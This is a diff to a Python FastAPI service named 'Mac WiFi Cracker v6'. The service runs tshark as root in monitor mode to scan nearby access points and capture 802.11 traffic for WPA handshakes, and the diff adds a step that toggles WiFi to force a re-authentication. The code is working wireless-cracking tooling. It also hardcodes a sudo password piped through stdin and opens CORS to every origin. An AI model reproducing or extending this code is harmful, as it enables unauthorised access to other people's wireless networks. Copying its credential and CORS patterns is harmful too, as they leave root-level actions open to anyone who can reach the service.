@@ -14,6 +14,8 @@ import uvicorn
 app = FastAPI(title="Mac WiFi Cracker v6")
 app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
 
+# Use Ethernet IP (stable) - Windows has both WiFi (192.168.1.107) and Ethernet
+# If WiFi is disconnected, use the Ethernet IP
 WINDOWS_URL = "http://192.168.1.107:8766"
 TSHARK = "/usr/local/bin/tshark"
 SUDO_PASS = " "  # space
@@ -68,33 +70,40 @@ def scan_wifi(duration=10):
             ["sudo", "-S", TSHARK, "-i", "en0", "-I", "-y", "IEEE802_11", "-c", "300", "-w", cap_file],
             stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        p.stdin.write(SUDO_PASS + "\n")
+        p.stdin.write((SUDO_PASS + "\n").encode())
         p.stdin.flush()
         time.sleep(duration)
         p.terminate()
         p.wait()
         log(f"Scan capture: {cap_file} ({p.returncode})")
-        # Parse beacons (dedupe by BSSID, keep best RSSI)
+        # Fix permissions (tshark runs as root)
+        home_cap = f"/Users/crazydb911/{Path(cap_file).name}"
+        subprocess.run(["sudo", "-S", "cp", cap_file, home_cap],
+                      input=(SUDO_PASS + "\n").encode(), capture_output=True, timeout=10)
+        subprocess.run(["sudo", "-S", "chmod", "644", home_cap],
+                      input=(SUDO_PASS + "\n").encode(), capture_output=True, timeout=10)
+        cap_file = home_cap
+        # Parse beacons (SSID is hex-encoded in wlan.ssid field)
         r = subprocess.run(
-            [TSHARK, "-r", cap_file, "-Y", "wlan.mgt && wlan.ssid", "-T", "fields",
-             "-e", "wlan.sa", "-e", "wlan.ssid", "-e", "wlan.channel", "-e", "wlan.signal"],
+            [TSHARK, "-r", cap_file, "-Y", "wlan", "-T", "fields",
+             "-e", "wlan.sa", "-e", "wlan.ssid"],
             capture_output=True, text=True, timeout=30)
-        log(f"Scan parse: {len(r.stdout.strip().splitlines())} beacon lines")
-        ap_map = {}  # bssid -> {ssid, channel, rssi}
+        log(f"Scan parse: {len(r.stdout.strip().splitlines())} lines")
+        ap_map = {}  # bssid -> {ssid, rssi}
         for line in r.stdout.strip().splitlines():
             parts = line.split('\t')
-            if len(parts) >= 4:
-                bssid, ssid, ch, sig = parts[0], parts[1], parts[2], parts[3]
-                if not bssid or bssid == "00:00:00:00:00:00":
+            if len(parts) >= 2:
+                bssid, ssid_hex = parts[0], parts[1]
+                if not bssid or bssid == "00:00:00:00:00:00" or not ssid_hex:
                     continue
-                rssi = int(sig) if sig.lstrip('-').isdigit() else 0
-                if bssid in ap_map:
-                    if rssi > ap_map[bssid]["rssi"]:
-                        ap_map[bssid]["rssi"] = rssi
-                        ap_map[bssid]["channel"] = ch
-                else:
-                    ap_map[bssid] = {"bssid": bssid, "ssid": ssid, "channel": ch,
-                                     "rssi": rssi, "security": "WPA2", "mode": "802.11"}
+                # Decode hex SSID
+                try:
+                    ssid = bytes.fromhex(ssid_hex).decode('utf-8', errors='replace')
+                except:
+                    ssid = ssid_hex
+                if bssid not in ap_map:
+                    ap_map[bssid] = {"bssid": bssid, "ssid": ssid, "channel": "",
+                                     "rssi": 0, "security": "WPA2", "mode": "802.11"}
         ap_list = list(ap_map.values())
         ap_list.sort(key=lambda x: x["rssi"], reverse=True)
         STATE["ap_list"] = ap_list
@@ -120,14 +129,35 @@ def start_capture(bssid, ssid, duration=60):
         # Capture ALL 802.11 frames (don't filter - EAPOL filter was unreliable)
         p = subprocess.Popen(
             ["sudo", "-S", TSHARK, "-i", "en0", "-I", "-y", "IEEE802_11",
-             "-c", "2000", "-w", cap_file],
+             "-c", "5000", "-w", cap_file],
             stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
         )
-        p.stdin.write(SUDO_PASS + "\n")
+        p.stdin.write((SUDO_PASS + "\n").encode())
         p.stdin.flush()
+        # After 5s, toggle WiFi to force re-auth (EAPOL handshake)
+        # Use networksetup (gentler, doesn't kill tshark)
+        def toggle_wifi():
+            time.sleep(5)
+            log("Toggling WiFi: setairportpower off")
+            subprocess.run(["networksetup", "-setairportpower", "en0", "off"],
+                          capture_output=True, timeout=10)
+            time.sleep(5)
+            log("Toggling WiFi: setairportpower on")
+            subprocess.run(["networksetup", "-setairportpower", "en0", "on"],
+                          capture_output=True, timeout=10)
+        t = threading.Thread(target=toggle_wifi, daemon=True)
+        t.start()
         time.sleep(duration)
         p.terminate()
         p.wait()
+        # Fix permissions
+        home_cap = f"/Users/crazydb911/{Path(cap_file).name}"
+        subprocess.run(["sudo", "-S", "cp", cap_file, home_cap],
+                      input=(SUDO_PASS + "\n").encode(), capture_output=True, timeout=10)
+        subprocess.run(["sudo", "-S", "chmod", "644", home_cap],
+                      input=(SUDO_PASS + "\n").encode(), capture_output=True, timeout=10)
+        cap_file = home_cap
+        STATE["capture_file"] = cap_file
         # Count EAPOL frames
         r = subprocess.run(
             [TSHARK, "-r", cap_file, "-Y", "eapol", "-T", "fields", "-e", "frame.number"],
